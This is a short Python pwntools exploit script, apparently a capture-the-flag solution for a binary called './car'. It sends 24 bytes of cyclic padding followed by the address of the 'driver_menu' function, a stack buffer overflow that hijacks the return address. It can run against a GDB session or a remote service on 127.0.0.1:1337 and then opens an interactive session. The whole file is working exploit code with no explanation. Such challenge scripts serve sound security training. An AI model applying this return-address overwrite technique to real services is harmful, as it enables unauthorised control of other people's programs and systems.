from pwn import *

binary = './car'
HOST   = '127.0.0.1'
PORT   = 1337

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary,checksec=False)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST,PORT)
    else:
        log.info('Did not specify GDB or REMOTE. Exiting')
        exit()

p = start()

payload = cyclic(24)
payload += p64(e.sym['driver_menu'])
p.sendline(payload)

p.interactive()